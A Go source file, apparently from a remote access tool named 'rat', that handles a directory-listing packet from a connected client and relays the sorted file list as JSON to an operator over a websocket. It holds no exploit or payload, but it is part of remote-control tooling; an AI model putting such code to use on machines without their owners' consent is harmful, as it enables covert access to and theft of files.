package main

import (
	"encoding/json"
	"fmt"
	"rat/shared"

	humanize "github.com/dustin/go-humanize"

	"golang.org/x/net/websocket"
)

type FileData struct {
	Dir    bool
	Name   string
	Edited string
	Size   int64
}

type DirectoryPacket struct {
	Path  string     `network:"send,receive"`
	Files []FileData `network:"receive"`
}

func (packet DirectoryPacket) Header() shared.PacketHeader {
	return shared.DirectoryHeader
}

func (packet DirectoryPacket) Init(c *Client) {

}

type File struct {
	Dir  bool   `json:"directory"`
	Path string `json:"path"`
	Size string `json:"size"`
	Time string `json:"time"`
}

func (packet DirectoryPacket) OnReceive(c *Client) error {
	dirs := make([]File, 0)
	files := make([]File, 0)

	for _, file := range packet.Files {
		file := File{file.Dir, file.Name, humanize.Bytes(uint64(file.Size)), file.Edited}

		if file.Dir {
			dirs = append(dirs, file)
		} else {
			files = append(files, file)
		}
	}

	if ws, ok := c.Listeners[shared.DirectoryHeader]; ok {
		json, err := json.Marshal(append(dirs, files...))

		if err != nil {
			fmt.Println(err)
		}

		event := newEvent(DirectoryQueryEvent, c.Id, string(json))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	delete(c.Listeners, shared.DirectoryHeader)

	return nil
}
